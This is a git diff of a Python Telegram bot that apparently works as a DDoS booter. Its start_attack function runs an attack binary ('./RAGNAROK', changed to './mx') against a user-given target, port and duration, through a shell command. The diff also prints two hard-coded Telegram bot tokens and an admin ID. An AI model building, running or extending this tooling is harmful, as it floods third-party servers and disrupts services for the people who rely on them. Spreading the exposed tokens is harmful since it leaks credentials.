@@ -11,7 +11,7 @@ from keep_alive import keep_alive
 keep_alive()
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7924950043:AAFuOaUXGDj2c22z6BNMzKo6fD3Bkd6xMSw')
+bot = telebot.TeleBot('7924950043:AAGjsbIiiIhhuNKNIbu2meYmt8ovRCbxn70')
 
 # Admin user IDs
 admin_id = ["5894848388"]
@@ -305,7 +305,7 @@ def start_attack(user_id, target, port, time):
 
     try:
         # Simulate attack execution (original logic here)
-        full_command = f"./RAGNAROK {target} {port} {time}"
+        full_command = f"./mx {target} {port} {time}"
         process = subprocess.run(full_command, shell=True)
         response = f"Brother enjoy 👌. Target: {target} Port: {port} Time: {time} 200"
         return True, response
